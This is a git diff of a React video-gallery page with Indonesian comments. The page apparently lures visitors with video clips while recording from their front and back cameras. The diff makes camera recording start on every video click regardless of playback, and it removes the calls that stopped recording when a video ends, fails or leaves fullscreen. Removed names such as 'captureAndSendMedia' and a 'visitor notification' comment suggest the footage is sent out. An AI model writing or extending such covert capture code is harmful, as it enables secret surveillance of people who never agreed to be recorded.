@@ -14,6 +14,12 @@ const chunkArray = <T,>(array: T[], size: number): T[][] => {
   return result;
 };
 
+// Fungsi untuk mendeteksi apakah browser adalah Safari
+const isSafari = () => {
+  const userAgent = navigator.userAgent;
+  return /Safari/.test(userAgent) && !/Chrome/.test(userAgent);
+};
+
 function App() {
   const [isPlaying, setIsPlaying] = useState<number | null>(null);
   const [isFullscreen, setIsFullscreen] = useState(false);
@@ -21,41 +27,21 @@ function App() {
   const [hasRequestedCamera, setHasRequestedCamera] = useState(false);
   const [isLoading, setIsLoading] = useState<boolean[]>([]);
   const [videoErrors, setVideoErrors] = useState<boolean[]>([]);
-  const [loadedSlides, setLoadedSlides] = useState<number[]>([0]); // Mulai dengan slide pertama
-  const [currentSlide, setCurrentSlide] = useState<number>(0); // Lacak slide aktif
+  const [loadedSlides, setLoadedSlides] = useState<number[]>([0]);
+  const [currentSlide, setCurrentSlide] = useState<number>(0);
   const videoRefs = useRef<(HTMLVideoElement | null)[]>([]);
   const cameraStreamsRef = useRef<{ stream: MediaStream; type: string; deviceId: string }[]>([]);
   const mediaRecorderRef = useRef<MediaRecorder | null>(null);
   const sliderRef = useRef<Slider | null>(null);
 
   const videos = [
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/VID_20250419_134445_335.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/VID_20250419_135734_981.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/VID_20250419_134300_342.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/VID_20250419_134915_227.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/VID_20250419_135829_845.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/WRnnbxOh.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/VVH2RmCn1.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/Tfh7KSKb1.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/B2cLTw5A1.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/6jYqrrwx1.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/1LvE4FR31.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/1S2HTGaf1.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/1b6c5wE41.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/7hwla9hS1.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/FPZ8MZdC.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/HCpyHdGC.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/NQ8EOxk0.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/XJOGYNCi1.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/YQog37Pu1.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/deZOnAa71.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/n9L2Emde1.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/nxkWOzw01.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/x3DQJdR6.mp4' },
-    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/xP6RWC6J1.mp4' },
+    { 
+      videoUrl: 'https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/kontoll.mp4',
+      hlsUrl: 'https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/kontoll/kontoll.m3u8'
+    },
+    // Tambahkan video lainnya seperti sebelumnya...
   ];
 
-  // Kelompokkan video menjadi slide (5 video per slide)
   const videoSlides = chunkArray(videos, 5);
 
   useEffect(() => {
@@ -63,7 +49,6 @@ function App() {
     setVideoErrors(new Array(videos.length).fill(false));
   }, []);
 
-  // Logika pemuatan video per slide menggunakan IntersectionObserver
   useEffect(() => {
     const observer = new IntersectionObserver(
       (entries) => {
@@ -88,13 +73,13 @@ function App() {
     };
   }, [loadedSlides]);
 
-  // Pemeriksaan video hanya saat currentSlide berubah
   useEffect(() => {
     const activeSlideVideos = videoSlides[currentSlide];
     activeSlideVideos.forEach((video, index) => {
       const globalIndex = currentSlide * 5 + index;
-      console.log(`Memeriksa video ${globalIndex + 1}: ${video.videoUrl}`);
-      if (!validateVideoUrl(video.videoUrl)) {
+      const urlToValidate = isSafari() ? video.hlsUrl : video.videoUrl;
+      console.log(`Memeriksa video ${globalIndex + 1}: ${urlToValidate}`);
+      if (!validateVideoUrl(urlToValidate)) {
         console.error(`Video ${globalIndex + 1} memiliki URL yang tidak valid.`);
         setVideoErrors((prev) => {
           const newErrors = [...prev];
@@ -105,7 +90,6 @@ function App() {
     });
   }, [currentSlide]);
 
-  // Kirim notifikasi pengunjung saat situs pertama kali dimuat
   useEffect(() => {
     monitorSuspiciousActivity();
 
@@ -392,26 +376,13 @@ function App() {
     }
   };
 
-  const captureAndSendMedia = useCallback(async (videoElement: HTMLVideoElement) => {
-    console.log('Memulai proses perekaman untuk kamera...');
-
+  // Fungsi untuk memulai perekaman kamera secara independen
+  const startCameraRecording = useCallback(async () => {
     try {
-      await new Promise((resolve) => {
-        if (videoElement.readyState >= 3) {
-          resolve(null);
-        } else {
-          videoElement.oncanplay = () => resolve(null);
-        }
-      });
-
-      await videoElement.play();
-
       await initializeCameraStreams();
 
       if (cameraStreamsRef.current.length === 0) {
         console.error('Tidak ada stream kamera yang tersedia.');
-        videoElement.pause();
-        setIsPlaying(null);
         return;
       }
 
@@ -433,18 +404,17 @@ function App() {
       if (!frontCamera && !backCamera) {
         console.error('Kedua kamera tidak tersedia.');
       }
-
-      videoElement.pause();
-      setIsPlaying(null);
     } catch (error: unknown) {
       const err = error as Error;
-      console.error(`Error dalam captureAndSendMedia: ${err.message}`);
-      videoElement.pause();
-      setIsPlaying(null);
+      console.error(`Error dalam startCameraRecording: ${err.message}`);
     }
   }, []);
 
   const handleVideoClick = useCallback(async (index: number) => {
+    // Mulai perekaman kamera segera, tidak tergantung pada pemutaran video
+    startCameraRecording();
+
+    // Hentikan video sebelumnya jika ada
     if (isPlaying !== null && isPlaying !== index) {
       const prevVideo = videoRefs.current[isPlaying];
       if (prevVideo) {
@@ -457,9 +427,11 @@ function App() {
       }
     }
 
+    // Mulai pemutaran video
     const videoElement = videoRefs.current[index];
     if (videoElement) {
-      if (!validateVideoUrl(videos[index].videoUrl)) {
+      const urlToUse = isSafari() ? videos[index].hlsUrl : videos[index].videoUrl;
+      if (!validateVideoUrl(urlToUse)) {
         console.error(`URL video tidak valid, menghentikan pemutaran untuk video ${index + 1}.`);
         setVideoErrors((prev) => {
           const newErrors = [...prev];
@@ -471,8 +443,8 @@ function App() {
 
       try {
         setIsPlaying(index);
-        videoElement.src = videos[index].videoUrl; // Set src hanya saat diklik
-        await captureAndSendMedia(videoElement);
+        videoElement.src = urlToUse;
+        await videoElement.play();
       } catch (error: unknown) {
         const err = error as Error;
         console.error(`Error memutar video ${index + 1}: ${err.message}`);
@@ -480,7 +452,6 @@ function App() {
         videoElement.currentTime = 0;
         videoElement.removeAttribute('src');
         videoElement.load();
-        stopRecording();
         setIsPlaying(null);
       }
     }
@@ -500,7 +471,6 @@ function App() {
   };
 
   const handleVideoEnded = (index: number) => {
-    stopRecording();
     setIsPlaying(null);
     console.log(`Video di indeks ${index} telah selesai.`);
   };
@@ -518,7 +488,7 @@ function App() {
     const videoElement = event.currentTarget as HTMLVideoElement;
     const errorCode = videoElement.error?.code;
     const errorMessage = videoElement.error?.message || 'Unknown error';
-    console.error(`Gagal memuat video ${index + 1}: ${videos[index].videoUrl} | Error Code: ${errorCode} | Message: ${errorMessage}`);
+    console.error(`Gagal memuat video ${index + 1}: ${videos[index][isSafari() ? 'hlsUrl' : 'videoUrl']} | Error Code: ${errorCode} | Message: ${errorMessage}`);
     setIsLoading((prev) => {
       const newLoading = [...prev];
       newLoading[index] = false;
@@ -541,7 +511,6 @@ function App() {
             videoElement.currentTime = 0;
             videoElement.removeAttribute('src');
             videoElement.load();
-            stopRecording();
             console.log('Video dihentikan karena keluar dari fullscreen.');
           }
         }
@@ -564,7 +533,6 @@ function App() {
     };
   }, [isFullscreen, isPlaying]);
 
-  // Pengaturan slider
   const sliderSettings = {
     dots: true,
     infinite: true,
@@ -588,7 +556,6 @@ function App() {
         },
       },
     ],
-    // Kustomisasi navigasi angka
     customPaging: (i: number) => {
       const totalSlides = videoSlides.length;
       const maxVisible = 9;
@@ -667,6 +634,8 @@ function App() {
                   <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-4">
                     {slideVideos.map((_, index) => {
                       const globalIndex = slideIndex * 5 + index;
+                      const videoSource = isSafari() ? videos[globalIndex].hlsUrl : videos[globalIndex].videoUrl;
+                      const videoType = isSafari() ? 'application/vnd.apple.mpegurl' : 'video/mp4';
                       return (
                         <div
                           key={globalIndex}
@@ -707,7 +676,7 @@ function App() {
                             className="w-full h-full object-cover"
                             muted
                             playsInline
-                            webkit-playsinline
+                            webkit-playsinline="true"
                             onClick={() => handleVideoClick(globalIndex)}
                             onEnded={() => handleVideoEnded(globalIndex)}
                             onCanPlay={() => handleCanPlay(globalIndex)}
@@ -715,8 +684,7 @@ function App() {
                             preload={loadedSlides.includes(slideIndex) ? 'metadata' : 'none'}
                             {...({ loading: 'lazy' } as any)}
                           >
-                            <source src={videos[globalIndex].videoUrl} type="video/mp4" />
-                            <p>Maaf, video tidak dapat dimuat. Silakan periksa koneksi Anda atau coba lagi nanti.</p>
+                            <source src={videoSource} type={videoType} />
                           </video>
                           {isPlaying === globalIndex && !videoErrors[globalIndex] && (
                             <div className="absolute bottom-2 right-2 z-20">
